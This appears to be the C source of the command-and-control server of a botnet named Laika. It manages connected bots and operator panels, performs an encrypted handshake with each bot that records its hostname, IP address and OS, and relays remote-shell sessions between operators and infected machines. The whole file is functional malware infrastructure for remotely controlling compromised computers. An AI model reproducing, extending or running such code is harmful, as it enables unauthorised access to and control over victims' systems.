#include "lmem.h"
#include "lsodium.h"
#include "lsocket.h"
#include "lerror.h"

#include "cpanel.h"
#include "cnc.h"

/* ===============================================[[ Peer Info ]]================================================ */

struct sLaika_peerInfo *allocBasePeerInfo(struct sLaika_cnc *cnc, size_t sz) {
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)laikaM_malloc(sz);
    
    pInfo->cnc = cnc;
    return pInfo;
}

struct sLaika_botInfo *laikaC_newBotInfo(struct sLaika_cnc *cnc) {
    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)allocBasePeerInfo(cnc, sizeof(struct sLaika_botInfo));

    bInfo->shellAuth = NULL;
    return bInfo;
}

struct sLaika_authInfo *laikaC_newAuthInfo(struct sLaika_cnc *cnc) {
    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)allocBasePeerInfo(cnc, sizeof(struct sLaika_authInfo));

    aInfo->shellBot = NULL;
    return aInfo;
}

void laikaC_freePeerInfo(struct sLaika_peer *peer, struct sLaika_peerInfo *pInfo) {
    peer->uData = NULL;
    laikaM_free(pInfo);
}

/* ==============================================[[ PeerHashMap ]]=============================================== */

typedef struct sCNC_PeerHashElem {
    struct sLaika_peer *peer;
    uint8_t *pub;
} tCNC_PeerHashElem;

int cnc_PeerElemCompare(const void *a, const void *b, void *udata) {
    const tCNC_PeerHashElem *ua = a;
    const tCNC_PeerHashElem *ub = b;

    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES); 
}

uint64_t cnc_PeerElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
    const tCNC_PeerHashElem *u = item;
    return *(uint64_t*)(u->pub); /* hashes pub key (first 8 bytes) */
}

/* ============================================[[ Packet Handlers ]]============================================= */

void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
    struct sLaika_cnc *cnc = bInfo->info.cnc;
    uint8_t _res = laikaS_readByte(&peer->sock);

    if (bInfo->shellAuth == NULL)
        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE malformed packet!");

    /* forward to SHELL_CLOSE to auth */
    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_CLOSE);

    /* close shell */
    ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
    bInfo->shellAuth = NULL;
}

void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
    uint8_t id;

    if (bInfo->shellAuth == NULL || sz < 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
        LAIKA_ERROR("LAIKAPKT_SHELL_DATA malformed packet!");

    laikaS_read(&peer->sock, (void*)buf, sz);

    /* forward SHELL_DATA packet to auth */
    laikaS_startVarPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_DATA);
    laikaS_write(&bInfo->shellAuth->sock, buf, sz);
    laikaS_endVarPacket(bInfo->shellAuth);
}

void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    char magicBuf[LAIKA_MAGICLEN];
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    char *tempIPBuf;
    uint8_t major, minor;

    laikaS_read(&peer->sock, (void*)magicBuf, LAIKA_MAGICLEN);
    major = laikaS_readByte(&peer->sock);
    minor = laikaS_readByte(&peer->sock);
    peer->osType = laikaS_readByte(&peer->sock);
    peer->type = PEER_BOT;

    if (memcmp(magicBuf, LAIKA_MAGIC, LAIKA_MAGICLEN) != 0
        || major != LAIKA_VERSION_MAJOR
        || minor != LAIKA_VERSION_MINOR)
        LAIKA_ERROR("invalid handshake request!\n");

    /* read peer's public key */
    laikaS_read(&peer->sock, peer->peerPub, sizeof(peer->peerPub));

    /* read hostname & inet */
    laikaS_read(&peer->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
    laikaS_read(&peer->sock, peer->inet, LAIKA_INET_LEN);

    /* restore null-terminator */
    peer->hostname[LAIKA_HOSTNAME_LEN-1] = '\0';
    peer->inet[LAIKA_INET_LEN-1] = '\0';

    /* gen session keys */
    if (crypto_kx_server_session_keys(peer->inKey, peer->outKey, cnc->pub, cnc->priv, peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n");

    /* encrypt all future packets */
    laikaS_setSecure(peer, true);

    /* queue response */
    laikaS_startOutPacket(peer, LAIKAPKT_HANDSHAKE_RES);
    laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
    laikaS_endOutPacket(peer);

    /* handshake (mostly) complete */
    laikaC_onAddPeer(cnc, peer);

    LAIKA_DEBUG("accepted handshake from peer %p\n", peer);
}

/* =============================================[[ Packet Tables ]]============================================== */

#define DEFAULT_PKT_TBL \
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_REQ, \
        laikaC_handleHandshakeRequest, \
        LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN, \
    false), \
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, \
        laikaC_handleAuthenticatedHandshake, \
        sizeof(uint8_t), \
    false)

struct sLaika_peerPacketInfo laikaC_botPktTbl[LAIKAPKT_MAXNONE] = {
    DEFAULT_PKT_TBL,
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
        laikaC_handleShellClose,
        0,
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
        laikaC_handleShellData,
        0,
    true),
};

struct sLaika_peerPacketInfo laikaC_authPktTbl[LAIKAPKT_MAXNONE] = {
    DEFAULT_PKT_TBL,
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ,
        laikaC_handleAuthenticatedShellOpen,
        crypto_kx_PUBLICKEYBYTES + sizeof(uint16_t) + sizeof(uint16_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_CLOSE,
        laikaC_handleAuthenticatedShellClose,
        0,
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_DATA,
        laikaC_handleAuthenticatedShellData,
        0,
    true),
};

#undef DEFAULT_PKT_TBL

/* ==================================================[[ CNC ]]=================================================== */

struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
    struct sLaika_cnc *cnc = laikaM_malloc(sizeof(struct sLaika_cnc));

    /* init peer hashmap & panel list */
    cnc->peers = hashmap_new(sizeof(tCNC_PeerHashElem), 8, 0, 0, cnc_PeerElemHash, cnc_PeerElemCompare, NULL, NULL);
    cnc->authPeers = NULL;
    cnc->authPeersCap = 4;
    cnc->authPeersCount = 0;

    /* init socket & pollList */
    laikaS_initSocket(&cnc->sock, NULL, NULL, NULL, NULL); /* we just need it for the raw socket fd and abstracted API :) */
    laikaP_initPList(&cnc->pList);

    /* bind sock to port */
    laikaS_bind(&cnc->sock, port);

    /* add sock to pollList */
    laikaP_addSock(&cnc->pList, &cnc->sock);

    if (sodium_init() < 0) {
        laikaC_freeCNC(cnc);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    /* load keys */
    LAIKA_DEBUG("using pubkey: %s\n", LAIKA_PUBKEY);
    if (!laikaK_loadKeys(cnc->pub, cnc->priv, LAIKA_PUBKEY, LAIKA_PRIVKEY)) {
        laikaC_freeCNC(cnc);
        LAIKA_ERROR("Failed to init cnc keypairs!\n");
    }

    return cnc;
}

void laikaC_freeCNC(struct sLaika_cnc *cnc) {
    laikaS_cleanSocket(&cnc->sock);
    laikaP_cleanPList(&cnc->pList);
    hashmap_free(cnc->peers);
    laikaM_free(cnc);
}

void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
    int i;

    /* add peer to panels list (if it's a panel) */
    if (peer->type == PEER_AUTH)
        laikaC_addAuth(cnc, peer);

    /* notify connected panels of the newly connected peer */
    for (i = 0; i < cnc->authPeersCount; i++) {
        laikaC_sendNewPeer(cnc->authPeers[i], peer);
    }

    /* add to peer lookup map */
    hashmap_set(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
}

void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
    int i;

    switch (peer->type) {
        case PEER_BOT: {
            struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)peer->uData;

            /* close any open shells */
            if (bInfo->shellAuth)
                laikaC_closeBotShell(bInfo);
            break;
        }
        case PEER_AUTH: {
            struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)peer->uData;

            /* close any open shells */
            if (aInfo->shellBot)
                laikaC_closeAuthShell(aInfo);

            /* remove peer from panels list */
            laikaC_rmvAuth(cnc, peer);
            break;
        }
        default: break;
    }

    /* notify connected panels of the disconnected peer */
    for (i = 0; i < cnc->authPeersCount; i++) {
        laikaC_sendRmvPeer(cnc->authPeers[i], peer);
    }

    /* remove from peer lookup map */
    hashmap_delete(cnc->peers, &(tCNC_PeerHashElem){.pub = peer->peerPub, .peer = peer});
}

void laikaC_setPeerType(struct sLaika_cnc *cnc, struct sLaika_peer *peer, PEERTYPE type) {
    /* free old peerInfo */
    laikaC_freePeerInfo(peer, peer->uData);

    /* update accepted packets */
    switch (type) {
        case PEER_AUTH:
            peer->packetTbl = laikaC_authPktTbl;
            peer->uData = laikaC_newAuthInfo(cnc);
            break;
        case PEER_BOT:
            peer->packetTbl = laikaC_botPktTbl;
            peer->uData = laikaC_newBotInfo(cnc);
            break;
        default:
            LAIKA_ERROR("laikaC_setPeerType: invalid peerType!\n");
            break;
    }

    /* make sure to update connected peers */
    laikaC_onRmvPeer(cnc, peer);
    peer->type = type;

    /* a new (but not-so-new) peer has arrived */
    laikaC_onAddPeer(cnc, peer);
}

void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer) {
    int i;

    for (i = 0; i < cnc->authPeersCount; i++) {
        if (cnc->authPeers[i] == authPeer) { /* we found the index for our panel! */
            laikaM_rmvarray(cnc->authPeers, cnc->authPeersCount, i, 1);
            return;
        }
    }
}

void laikaC_addAuth(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer) {
    /* grow array if we need to */
    laikaM_growarray(struct sLaika_peer*, cnc->authPeers, 1, cnc->authPeersCount, cnc->authPeersCap);

    /* insert into authenticated peer table */
    cnc->authPeers[cnc->authPeersCount++] = authPeer;

    LAIKA_DEBUG("added panel %p!\n", authPeer);
}

void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
    laikaC_onRmvPeer(cnc, peer);

    /* free peerInfo if it's defined */
    if (peer->uData)
        laikaC_freePeerInfo(peer, peer->uData);

    laikaP_rmvSock(&cnc->pList, (struct sLaika_socket*)peer);
    laikaS_freePeer(peer);

    LAIKA_DEBUG("peer %p killed!\n", peer);
}

/* socket event */
void laikaC_onPollFail(struct sLaika_socket *sock, void *uData) {
    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
    struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
    laikaC_killPeer(cnc, peer);
}

bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
    struct sLaika_peer *peer;
    struct sLaika_pollEvent *evnts;
    int numEvents, i;

    laikaP_flushOutQueue(&cnc->pList);
    evnts = laikaP_poll(&cnc->pList, timeout, &numEvents);

    /* if we have 0 events, we reached the timeout, let the caller know */
    if (numEvents == 0) {
        return false;
    }

    /* walk through and handle each event */
    for (i = 0; i < numEvents; i++) {
        if (evnts[i].sock == &cnc->sock) { /* event on listener? */
            peer = laikaS_newPeer(
                laikaC_botPktTbl,
                &cnc->pList,
                laikaC_onPollFail,
                cnc,
                (void*)laikaC_newBotInfo(cnc)
            );

            LAIKA_TRY
                /* setup and accept new peer */
                laikaS_acceptFrom(&peer->sock, &cnc->sock, peer->ipv4);
                laikaS_setNonBlock(&peer->sock);

                /* add to our pollList */
                laikaP_addSock(&cnc->pList, &peer->sock);

                LAIKA_DEBUG("new peer %p!\n", peer);
            LAIKA_CATCH
                /* acceptFrom() and setNonBlock() can fail */
                LAIKA_DEBUG("failed to accept peer %p!\n", peer);
                laikaS_freePeer(peer);
            LAIKA_TRYEND
            continue;
        }

        peer = (struct sLaika_peer*)evnts[i].sock;

        laikaP_handleEvent(&evnts[i]);
    }

    laikaP_flushOutQueue(&cnc->pList);
    return true;
}

struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub) {
    tCNC_PeerHashElem *elem = (tCNC_PeerHashElem*)hashmap_get(cnc->peers, &(tCNC_PeerHashElem){.pub = pub});

    return elem ? elem->peer : NULL;
}

/* ===============================================[[ Peer Iter ]]================================================ */

struct sWrapperData {
    tLaika_peerIter iter;
    void *uData;
};

/* wrapper iterator */
bool iterWrapper(const void *rawItem, void *uData) {
    struct sWrapperData *data = (struct sWrapperData*)uData;
    tCNC_PeerHashElem *item = (tCNC_PeerHashElem*)rawItem;
    return data->iter(item->peer, data->uData);
}

void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData) {
    struct sWrapperData wrapper;
    wrapper.iter = iter;
    wrapper.uData = uData;

    /* iterate over hashmap calling our iterWrapper, pass the *real* iterator to
        itemWrapper so that it can call it. probably a better way to do this 
        but w/e lol */
    hashmap_scan(cnc->peers, iterWrapper, &wrapper);
}